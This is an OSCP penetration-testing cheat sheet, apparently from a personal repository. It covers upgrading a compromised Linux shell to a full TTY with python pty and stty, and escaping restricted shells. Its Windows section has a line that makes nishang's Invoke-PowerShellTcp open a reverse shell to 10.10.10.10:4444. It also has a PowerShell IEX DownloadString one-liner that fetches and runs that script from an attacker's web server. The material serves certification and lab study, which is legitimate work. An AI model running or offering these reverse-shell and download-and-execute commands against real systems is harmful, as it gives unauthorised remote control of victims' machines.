# OSCP Shell Upgrade and Shell Escape Cheat Sheet
Created by mr-b4rt0wsk1 on 06/30/2020

## Upgrade to full feature TTY shell (Linux/Unix)

1. Use one of the following to get into a python shell.  You can check which python and shells are available by using the `which` command
    * `python -c 'import pty; pty.spawn("/bin/bash")';`
    * `python -c 'import pty; pty.spawn("/bin/sh")';`
    * `python3 -c 'import pty; pty.spawn("/bin/bash")';`
    * `python3 -c 'import pty; pty.spawn("/bin/sh")';`
2. Background the process (the shell) using **Ctrl+Z**
3. Get terminal information
    1. `echo $TERM`: take note of the value returned
    2. `stty -a`: take note of the rows and columns
4. Echo the input characters `stty raw -echo`
5. Foreground the process (the shell).  At this point, what you are typing will not appear in the terminal.  This is normal
    1. `fg`
    2. `reset`: you may be prompted to enter the value from `echo $TERM` after executing this
6. Enter the information you have gathered
    1. `export SHELL=bash`
    2. `export TERM=*value from 3.1*`
    3. `stty rows *value from 3.2* cols *value from 3.2*`
7. You should now be able to use tab completion, clear the screen, use vi, etc.  Enjoy!

## PATH variable (Linux/Unix)
This PATH variable is useful if in a restricted environment or if you simply just don't have all of this in there yet

`export PATH='/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'`

## Upgrade to PowerShell reverse shell (Windows) (see Optimum HTB ippsec video)

The file we want to use is located at `/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1` on Kali Linux

Insert this line at the end of the script to call the function and send a reverse shell

`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444`

Use this command to call it from your python web server

`powershell.exe IEX(New-Object+System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')`

## Resources
* Linux/Unix
    * Getting a TTY shell [blog](https://w00troot.blogspot.com/2017/11/using-vi-in-low-privilege-shell.html)
    * Linux Restricted Shell Bypass [exploit-db PDF](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
    * Restricted Linux Shell Escaping Techniques [article](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
    * GTFOBins [repo](https://gtfobins.github.io/)
* Windows
    * nishang [repo](https://github.com/samratashok/nishang)
    * ippsec Optimum HTB [video](https://www.youtube.com/watch?v=kWTnVBIpNsE&ab_channel=IppSec)